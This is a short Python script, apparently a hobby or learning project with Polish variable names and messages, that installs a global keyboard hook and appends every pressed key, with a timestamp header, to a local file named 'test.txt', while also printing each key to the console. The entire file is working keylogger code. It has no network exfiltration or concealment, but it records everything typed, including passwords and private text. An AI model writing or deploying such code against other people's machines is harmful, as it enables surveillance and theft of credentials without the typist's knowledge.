# -*- coding: utf-8 -*-
import keyboard
import time

nazwa_pliku = "test.txt"
time_now = time.localtime()
lokalnie = time.strftime("month: %d %B\nhour: %H:%M:%S\n", time_now)

with open(nazwa_pliku, 'a') as plik:
    plik.writelines(f"\n {lokalnie} \n")


def on_key_pressed(e):
    if e.name not in ["shift", "ctrl", "alt", "alt gr", "backspace"]:
        print(f"Przycisk '{e.name}' został wciśnięty.")
        with open(nazwa_pliku, 'a') as plik:

            if e.name in ["down", "up", "left", "right"]:
                plik.writelines(e.name + "\n")

            elif e.name in ["space", "enter", "alt", "esc", "caps lock"]:
                plik.writelines(f" ({e.name}) ")


            else:
                plik.writelines(e.name)


keyboard.on_press(on_key_pressed)

while True:
    pass
